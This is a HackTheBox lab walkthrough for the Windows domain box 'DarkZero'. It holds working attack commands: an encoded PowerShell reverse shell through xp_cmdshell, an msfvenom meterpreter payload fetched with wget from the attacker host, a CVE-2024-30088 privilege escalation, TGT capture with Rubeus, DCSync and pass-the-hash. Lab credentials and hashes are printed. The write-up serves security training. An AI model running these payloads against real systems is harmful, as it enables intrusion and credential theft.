# DarkZero - HackTheBox Walkthrough

**Difficulty:** Hard  
**OS:** windows

## Recon

As is common in real life pentests, you will start the DarkZero box with credentials for the following account john.w / RFulUtONCOL!

```
Host is up (0.27s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-05 02:32:45Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info:
|   10.129.141.34:1433:
|     Target_Name: darkzero
|     NetBIOS_Domain_Name: darkzero
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: darkzero.htb
|     DNS_Computer_Name: DC01.darkzero.htb
|     DNS_Tree_Name: darkzero.htb
|_    Product_Version: 10.0.26100
|_ssl-date: 2025-10-05T02:34:41+00:00; +6h59m58s from scanner time.
| ms-sql-info:
|   10.129.141.34:1433:
|     Version:
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-05T02:25:09
|_Not valid after:  2055-10-05T02:25:09
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49891/tcp open  msrpc         Microsoft Windows RPC
49908/tcp open  msrpc         Microsoft Windows RPC
49963/tcp open  msrpc         Microsoft Windows RPC
61902/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-10-05T02:34:00
|_  start_date: N/A
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m57s

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   147.31 ms 10.10.16.1
2   212.45 ms 10.129.141.34

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct  4 23:04:46 2025 -- 1 IP address (1 host up) scanned in 415.03 seconds
```

now lets add the domain to the `/etc/hosts` file

```
┌──(kali㉿kali)-[~/CTF/HackTheBox/rooms/darkzero]
└─$ sudo vim /etc/hosts
...
#### HTB ####
10.129.175.200  dc01 dc01.darkzero.htb darkzero.htb
```

using `impacket-mssqlclient` to interact with the service

```
┌──(kali㉿kali)-[~/CTF/HackTheBox/rooms/darkzero]
└─$ impacket-mssqlclient 'darkzero.htb/john.w:RFulUtONCOL!@10.129.175.200' -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)>
```

as we enumerate the service, we can see that there is a linked server called `dc02.darkzero.ext`

```
SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL

DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL

Linked Server       Local Login       Is Self Mapping   Remote Login
-----------------   ---------------   ---------------   ------------
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc
```

we are `dbo` in `DC02`, meaning that we can execute system command on the linked server.

```
SQL (darkzero\john.w  guest@master)> use_link "DC02.darkzero.ext"
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> select user_name();

---
dbo
```

## Foothold

i will use a encoded powershell payload to get a reverse shell

```
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4ANQAyACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB...

┌──(kali㉿kali)-[~/CTF/HackTheBox/rooms/darkzero]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.15.52] from (UNKNOWN) [10.129.175.200] 52457

PS C:\Windows\system32> whoami
darkzero-ext\svc_sql

```

next i will upload a `msfvenom` payload to upgrade my shell to a meterpreter session

```
┌──(kali㉿kali)-[~/CTF/HackTheBox/rooms/darkzero]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.52 LPORT=5555 -f exe -o reverse.exe
...
┌──(kali㉿kali)-[~/CTF/HackTheBox/rooms/darkzero]
└─$ python -m http.server 80
```

```
PS C:\Users\svc_sql> wget http://10.10.15.52/reverse.exe -O reverse.exe

PS C:\Users\svc_sql> ./reverse.exe
```

```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 5555
lport => 5555
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:5555
[*] Sending stage (203846 bytes) to 10.129.175.200
[*] Meterpreter session 1 opened (10.10.15.52:5555 -> 10.129.175.200:52496) at 2025-10-16 01:14:37 +0330

meterpreter >
```

## User.txt

we can use `multi/recon/local_exploit_suggester` to search for any local vulnerability.

```
msf6 post(multi/recon/local_exploit_suggester) > run session=1
[*] 172.16.20.2 - Collecting local exploits for x64/windows...
...
[+] 172.16.20.2 - exploit/windows/local/cve_2024_30088_authz_basep: The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
...
```

the server is vulnerable to `CVE-2024-30088` we can exploit that to get root access.

```
msf6 exploit(windows/local/cve_2024_30088_authz_basep) > run session=1
[*] Started reverse TCP handler on 10.10.15.52:6666
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
[*] Reflectively injecting the DLL into 3020...
[+] The exploit was successful, reading SYSTEM token from memory...
[+] Successfully stole winlogon handle: 876
[+] Successfully retrieved winlogon pid: 604
[*] Sending stage (203846 bytes) to 10.129.175.200
[*] Meterpreter session 2 opened (10.10.15.52:6666 -> 10.129.175.200:52546) at 2025-10-16 01:26:46 +0330

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > ls 'C:\Users\Administrator\Desktop'
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2025-07-29 16:28:25 +0330  desktop.ini
100666/rw-rw-rw-  34    fil   2025-10-16 07:51:41 +0330  user.txt

```

## Root.txt

from here we can somehow exploit the trust between the `DC01` and `DC02` to get DC01 TGT and perform DCSync attack  
capturing a Domain Controller machine TGT (e.g., DC1$@DOMAIN for krbtgt@DOMAIN). You can then use that ccache to authenticate as the DC and perform DCSync without a password.
we can use `xp_dirtree` function form mssql and perform a request to `DC02` since we have admin access on DC02 and there is a trust between DC01 and DC02 we will be able to catch **DC01** TGT

```
SQL (darkzero\john.w  guest@master)> xp_dirtree //dc02.darkzero.ext/something
```

upload `Rubeus` and monitor for incoming tickets

```
PS C:\Users\Administrator\Desktop> ./Rubeus.exe monitor /interval:5 /nowrap
...

[*] 10/16/2025 5:26:20 AM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  10/15/2025 10:26:18 PM
  EndTime               :  10/16/2025 8:26:18 AM
  RenewTill             :  10/22/2025 10:26:18 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDYC/eYqqXzajAlBY1lqmFMXkM313mGfQvqKFrPviOwtkwZ89GJtQBHLmdQ8ULbENzV06w6dR442yd5Tg54Xy7ab48Z8Vs8FLVsoDlxBDN9FAw5Y2LN1QoJS/yJFUI+UAJWmjqqpyMCakKOBy82hr0rx8pBn/wC+Gsyl2vwkoeXH2bobw3AtH/eRmViOtHcAxYFOShfagx/ID/KVwE5qyROPmNzNBADXhcUz1dpQQvTDohNxf9R6Wb0rRZ+i8Dbai6Fd63yUSjnz01zG2/mKlmgNc5eUPreTz7iFrg1HqrZA0SE19Vb+EfJRJvpyFZkpneeSwkORoezU40/P1G/OmQaAJa49hYWFCPzpI7dVlVKAv9aglBTxr5jBZWTNsQLRUJ2bgIqOTTYP/+Dy3nafmc162+XaSxKXKXW2EgdrLOMd6SU3IXeoirdqqWRypkohIDYGBmN8/zhxbfn4ezofK5cHHcbEUlnPKrlg8g772mPKuPFz6X28RQXCnRt+CkPHvBo2kwHxQKNyyl+PLLyHgi3tEorMZqitj4BHHnc+kdOxJe0we298I3+LIeJJglkztXZW0ryRl8CH2dZ/misUQDDQk7QoJyoJ7HUNkBU32Yg6i2PD3BgBsUmiUsA/2FV7e59oS5P6oO/qEJrrWCciPMc/JnrA3mHvI0llxa+VIQm7MNMuX+OyIeRE60lbxyn08/DqDnUH+Dp7vqAib4o4douwXxG7Qwe5N/u3QKAcysjjoEH+cAXA9xSkI5GYdVpOrN5wNMvNr5iDRRgptyMjEzwoVvWINU5mSp5LoK96NqvV9Q+Y53q6A/oFJTOO0O25qHq5TJDLPnvwaj5B836GlZNqwiSRwkXGGg+f7uQVLhm/j6QlN9rdlb05qLq8XwzdcKbX64pW7+MmlCh5c4JnPJqQmbgy344fRPnWZY6lDYhhE7syTpxElD5yNnIVql5CwjJrk47M/AbibTaePVS49h1iF0dqDbLbJYc6nsNHqbB9LIhAjQSKGqYl49J85Wh4mqPa1UN9xqIU7zJM2e04Vft7qU47OPtLAnBmNnjI1p55j79zI1Ykwb1UV9pwI6CNofsgtwhIUHou1GX3g5eyT/AIDKsRyBkwmkwLkP7p6UJwpBOCqoFH9V5d+5qiTBkM94ozk1u13SB9OxHb06HtGthnN/38p0HWUEmm3vEO8eU1e1ggdRoKKUH2714yzMGkotO4Y/a3FAr21f75DIo1Rwi6KeRw5bG1KW/ZCAqg/5nDC4fMxt6e6dvsj8UJhe326KD489bEpXdP0lLYBM0Kbn1+HtPhalp1HAJHS9rcmbgAicCTVLJgS2Typw98hsOMTNfyGhsaj5iB71/N5kf8DRK/Dlfdchz0WZ0IJAVb/oynlrPfLQndl0PfOx45JwkBbxwos1W62EDlS8crn8r0OTA/xzjuVEb5o4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgHNiDUKW84whpHT1wi21hLvGO8VuY2rL3LerNk3MpOa+hDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMTYwNTI2MThaphEYDzIwMjUxMDE2MTUyNjE4WqcRGA8yMDI1MTAyMzA1MjYxOFqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=

[*] Ticket cache size: 7
```

copy base64 ticket and convert it to a ccache using impacket.

```
┌──(kali㉿kali)-[~/CTF/HackTheBox/rooms/darkzero]
└─$ vim ticket_b64.txt

┌──(kali㉿kali)-[~/CTF/HackTheBox/rooms/darkzero]
└─$ cat ticket_b64.txt| base64 -d > ticket.kirbi

┌──(kali㉿kali)-[~/CTF/HackTheBox/rooms/darkzero]
└─$ impacket-ticketConverter ticket.kirbi ticket.ccache
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done
```

we can now perform the DCSync attack and dump DC01 credentials  
you might need to use `ntpdate` to sycn your attackbox clock with DC01 before using secretsdump

```
┌──(kali㉿kali)-[~/CTF/HackTheBox/rooms/darkzero]
└─$ sudo ntpdate dc01.darkzero.htb
```

```
┌──(kali㉿kali)-[~/CTF/HackTheBox/rooms/darkzero]
└─$ KRB5CCNAME=ticket.ccache impacket-secretsdump -k -no-pass -outputfile 'dcsync' -dc-ip '10.129.175.200' 'dc01.darkzero.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:64f4771e4c60b8b176c3769300f6f3f7:::
john.w:2603:aad3b435b51404eeaad3b435b51404ee:44b1b5623a1446b5831a7b3a4be3977b:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d02e3fe0986e9b5f013dad12b2350b3a:::
...
```

```
┌──(kali㉿kali)-[~/CTF/HackTheBox/rooms/darkzero]
└─$ impacket-psexec 'darkzero.htb/administrator@10.129.175.200' -hashes ":5917507bdf2ef2c2b0a869a1cba40726"
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.129.175.200.....
[*] Found writable share ADMIN$
[*] Uploading file vbVvBLsb.exe
[*] Opening SVCManager on 10.129.175.200.....
[*] Creating service bYxm on 10.129.175.200.....
[*] Starting service bYxm.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.26100.4652]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\System32> whoami
nt authority\system
...

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is EF7E-D912

 Directory of C:\Users\Administrator\Desktop

07/31/2025  03:21 PM    <DIR>          .
03/23/2025  08:38 PM    <DIR>          ..
10/15/2025  09:16 PM                34 root.txt
10/15/2025  09:16 PM                34 user.txt
               2 File(s)             68 bytes
               2 Dir(s)   6,331,604,992 bytes free

```
